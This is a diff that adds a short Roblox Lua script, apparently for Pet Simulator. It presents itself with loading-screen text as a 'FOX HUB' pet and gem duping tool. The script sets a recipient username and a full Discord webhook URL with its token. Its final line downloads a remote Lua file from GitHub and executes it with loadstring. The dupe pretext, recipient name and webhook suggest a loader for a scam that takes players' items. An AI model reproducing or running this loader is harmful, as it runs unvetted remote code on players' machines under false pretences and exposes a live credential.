@@ -1,0 +1,10 @@
+
+Username = "mihai98277771"
+WebHook = "https://discord.com/api/webhooks/1098329424765653022/ajVyCX5JKgoGSsHhf_MosLm7gxt5s8rMy07f6FFeNZGBl_p_Ks8aLki3fudOLm78LBcS"
+loadingscreen = true
+_G.CustomScriptName = "FOX HUB Duping"
+_G.Text1 = "Loading Script"
+_G.Text2 = "Search pets and gems To Duping"
+_G.Text3 = "Duping Gems"
+_G.Text4 = "Duping Pets"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
